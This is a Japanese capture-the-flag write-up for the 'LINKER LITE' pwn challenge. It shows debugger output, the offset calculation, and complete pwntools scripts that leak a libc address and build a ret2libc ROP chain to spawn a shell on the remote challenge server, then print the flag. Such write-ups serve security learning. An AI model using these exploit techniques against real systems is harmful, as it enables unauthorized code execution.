# LINKER LITE

やり方忘れちった

多分base addr leakからのROPな気がするけど

```bash
╰─ (*'-') < ROPgadget --binary ./linker-lite | grep "pop rdi"
0x0000000000401221 : mov ebp, esp ; pop rdi ; pop rsi ; pop rdx ; ret
0x0000000000401220 : mov rbp, rsp ; pop rdi ; pop rsi ; pop rdx ; ret
0x0000000000401223 : pop rdi ; pop rsi ; pop rdx ; ret
0x000000000040121f : push rbp ; mov rbp, rsp ; pop rdi ; pop rsi ; pop rdx ; ret
╭─ /Users/mionorn124/Downloads/dis (2)(pwn)
╰─ (*'-') < checksec linker-lite
[!] Could not populate PLT: No module named 'pkg_resources'
[*] '/Users/mionorn124/Downloads/dis (2)/linker-lite'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
╭─ /Users/mionorn124/Downloads/dis (2)(pwn)
╰─ (*'-') <
```

そーだよねaddr特定で頑張るタイプだよね

とりあえずがんばろ

```bash
root@ccd3606b95b3:/work# qemu-x86_64 -g 1234 ./ld-linux-x86-64.so.2 --library-path . ./linker-lite
plugin-loader v0.1
send plugin blob:
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab




aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
^C
qemu-x86_64: QEMU: Terminated via GDBstub
root@ccd3606b95b3:/work# 
root@ccd3606b95b3:/work# qemu-x86_64 -g 1234 ./ld-linux-x86-64.so.2 --library-path . ./linker-lite
^C
root@ccd3606b95b3:/work# qemu-x86_64 -g 1234 ./ld-linux-x86-64.so.2 --library-path . ./linker-lite
^C
root@ccd3606b95b3:/work# qemu-x86_64 -g 1234 ./ld-linux-x86-64.so.2 --library-path . ./linker-lite
v^C
root@ccd3606b95b3:/work# qemu-x86_64 -g 1234 ./ld-linux-x86-64.so.2 --library-path . ./linker-lite
plugin-loader v0.1
send plugin blob:
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac
```
```
pwndbg> cyclic 300
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac
pwndbg> c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x6161617461616173 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────
*RAX  0x100
 RBX  0
*RCX  0xffffa19cf510 ◂— 0x6161616261616161 ('aaaabaaa')
*RDX  0x100
 RDI  0
*RSI  0xffffa19cf510 ◂— 0x6161616261616161 ('aaaabaaa')
*R8   0x11
*R9   0x55555555c040 ◂— endbr64
*R10  0xffffa0fac5e8 ◂— 0xf001200001a64
*R11  0xffffa10ba920 (read) ◂— endbr64
*R12  0xffffa19cf670 —▸ 0xffffa19cf840 ◂— './linker-lite'
*R13  0x4011d8 (main) ◂— push rbp
*R14  0x403e18 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401110 (__do_global_dtors_aux) ◂— endbr64
*R15  0x555555590040 (_rtld_global) —▸ 0x5555555912f0 ◂— 0
*RBP  0x6161617261616171 ('qaaaraaa')
*RSP  0xffffa19cf560 ◂— 0x6161617661616175 ('uaaavaaa')
*RIP  0x6161617461616173 ('saaataaa')
──────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────
Invalid address 0x6161617461616173










───────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────
00:0000│ rsp 0xffffa19cf560 ◂— 0x6161617661616175 ('uaaavaaa')
01:0008│     0xffffa19cf568 ◂— 0x6161617861616177 ('waaaxaaa')
02:0010│     0xffffa19cf570 ◂— 0x6261617a61616179 ('yaaazaab')
03:0018│     0xffffa19cf578 ◂— 0x6261616362616162 ('baabcaab')
04:0020│     0xffffa19cf580 ◂— 0x6261616562616164 ('daabeaab')
05:0028│     0xffffa19cf588 ◂— 0x6261616762616166 ('faabgaab')
06:0030│     0xffffa19cf590 ◂— 0x6261616962616168 ('haabiaab')
07:0038│     0xffffa19cf598 ◂— 0x6261616b6261616a ('jaabkaab')
─────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────
 ► 0 0x6161617461616173
   1 0x6161617661616175
   2 0x6161617861616177
   3 0x6261617a61616179
   4 0x6261616362616162
   5 0x6261616562616164
   6 0x6261616762616166
   7 0x6261616962616168
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> cyclic -l $rip
Finding cyclic pattern of 4 bytes: b'saaa' (hex: 0x73616161)
Found at offset 72
```

72バイトでRIPね

一旦書くか

```python
from pwn import * 
HOST="linker-lite.wolvctf-2026.kctf.cloud"
PORT=1337

elf=ELF("./linker-lite")
# 0x0000000000401223 : pop rdi ; pop rsi ; pop rdx ; ret
ret_addr=0x401223
r=remote(HOST,PORT)
payload = b"A"*72
payload += p64(ret_addr)
payload += p64(elf.got["puts"])
payload += p64(0x000000)
payload += p64(0x000000)
payload += p64(elf.plt["puts"])
payload += p64(elf.sym["main"])

payload = payload.ljust(255, b"A")


r.sendline(payload)
r.interactive()

```
```bash
╭─ /Users/mionorn124/Downloads/dis (2)(pwn)
╰─ (*'-') < python3 solver.py
/opt/anaconda3/envs/pwn/lib/python3.10/site-packages/unicorn/unicorn_py3/unicorn.py:123: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
[*] '/Users/mionorn124/Downloads/dis (2)/linker-lite'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[+] Opening connection to linker-lite.wolvctf-2026.kctf.cloud on port 1337: Done
[*] Switching to interactive mode
== proof-of-work: disabled ==
plugin-loader v0.1
send plugin blob:
\x10\x9e6҂z
plugin-loader v0.1
send plugin blob:
$  
```

ランダム配置の元とれてるし、これとってsystem(/bin//sh)に持ち込みたい


合わないのAIに聞いたらret入れとけと言われてとりあえず2回目にretを入れとく

```python
from pwn import * 
HOST="linker-lite.wolvctf-2026.kctf.cloud"
PORT=1337


elf=ELF("./linker-lite")


rop = ROP(elf)
ret = rop.find_gadget(["ret"]).address

# 0x0000000000401223 : pop rdi ; pop rsi ; pop rdx ; ret
ret_addr=0x401223
r=remote(HOST,PORT)
payload = b"A"*72
payload += p64(ret_addr)
payload += p64(elf.got["puts"])
payload += p64(0x000000)
payload += p64(0x000000)
payload += p64(elf.plt["puts"])
payload += p64(elf.sym["main"])
payload = payload.ljust(255, b"A")
r.sendline(payload)

r.recvuntil(b"send plugin blob:\n")
leaked = r.recvline().rstrip(b"\n")

libc = ELF("./libc.so.6")
leak = u64(leaked.ljust(8, b"\x00"))
libc.address = leak - libc.sym["puts"]

r.recvuntil(b"send plugin blob:\n")
payload = b"A"*72
payload += p64(ret)
payload += p64(ret_addr)
payload += p64(next(libc.search(b"/bin/sh\x00")))
payload += p64(0x000000)
payload += p64(0x000000)
payload += p64(libc.sym["system"])

payload = payload.ljust(255, b"A")
r.sendline(payload)

r.interactive()
```

```bash
╰─ (*'-') < python3 solver.py
/opt/anaconda3/envs/pwn/lib/python3.10/site-packages/unicorn/unicorn_py3/unicorn.py:123: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
[*] '/Users/mionorn124/Downloads/dis (2)/linker-lite'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[*] Loaded 8 cached gadgets for './linker-lite'
[+] Opening connection to linker-lite.wolvctf-2026.kctf.cloud on port 1337: Done
[*] '/Users/mionorn124/Downloads/dis (2)/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
[*] Switching to interactive mode
$ ls
$ ls
$ ls
$ ls
$ 
[*] Interrupted
[*] Closed connection to linker-lite.wolvctf-2026.kctf.cloud port 1337
╭─ /Users/mionorn124/Downloads/dis (2)(pwn)
╰─ (*'-') < readelf -S ./linker-lite | grep win    
╭─ /Users/mionorn124/Downloads/dis (2)(pwn)
╰─ (*'-') < 
```

どういうこと？？winもなければ操作すらできないの謎

AIに聞いたら最小構成の可能性あるから、これを送れと言ってきた
```python
r.sendline(b'''
if [ -r /flag ]; then
    while IFS= read -r line || [ -n "$line" ]; do
        printf '%s\\n' "$line"
    done < /flag
fi
''')

print(repr(r.recvrepeat(3)))
```

諦めて送る

```bash
─ /Users/mionorn124/Downloads/dis (2)(pwn)
╰─ (*'-') < python3 solver.py
/opt/anaconda3/envs/pwn/lib/python3.10/site-packages/unicorn/unicorn_py3/unicorn.py:123: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
[*] '/Users/mionorn124/Downloads/dis (2)/linker-lite'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[*] Loaded 8 cached gadgets for './linker-lite'
[+] Opening connection to linker-lite.wolvctf-2026.kctf.cloud on port 1337: Done
[*] '/Users/mionorn124/Downloads/dis (2)/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
b'wctf{n0_le4k_n0_pr0blem_ret2dlresolve}\n'
[*] Switching to interactive mode
$ 
[*] Interrupted
[*] Closed connection to linker-lite.wolvctf-2026.kctf.cloud port 1337
╭─ /Users/mionorn124/Downloads/dis (2)(pwn)
╰─ (*'-') < 
```

マジでなんで？？？？

## flag
```
wctf{n0_le4k_n0_pr0blem_ret2dlresolve}
```
